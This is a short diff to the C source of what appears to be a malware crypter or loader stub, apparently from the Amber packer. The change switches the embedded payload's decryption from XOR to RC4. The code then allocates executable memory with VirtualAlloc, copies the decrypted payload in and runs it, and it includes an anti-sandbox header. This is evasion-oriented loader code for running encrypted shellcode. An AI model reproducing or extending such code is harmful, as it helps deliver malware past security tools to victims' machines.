@@ -2,7 +2,7 @@
 #include "AntiSandbox.h"
 #include "payload.h"
 #include "key.h"
-//#include "RC4.h"
+#include "RC4.h"
 
 const char LABEL[] = {"<Amber:27a01d4772038a3f83552908e0470604e773f8af>"}; // Descriptive label for yara rules ;D
 void ExecutePayload();
@@ -19,14 +19,15 @@ int main(int argc, char const *argv[])
 
 void ExecutePayload(){
 
+/*
 	for(int i = 0; i < sizeof(Payload); i++) {
 		Payload[i] = (Payload[i] ^ Payload_key[(i%sizeof(Payload_key))]);
 	}	
-/*
-	unsigned char s[256] = {0}; // Creates S box for key scheduling aglhorithm
-	rc4_init(s,Payload_key); // Apply key scheduling aglhorithm
-	rc4_decrypt(s,Payload);  // Decrypt payload...
 */
+	unsigned char s[256] = {0}; // Creates S box for key scheduling aglhorithm
+	rc4_init(s,Payload_key,Payload_key_len); // Apply key scheduling aglhorithm
+	rc4_decrypt(s,Payload,Payload_len);  // Decrypt payload...
+
 
 	char* BUFFER = (char*)VirtualAlloc(NULL, sizeof(Payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	memcpy(BUFFER, Payload, sizeof(Payload));
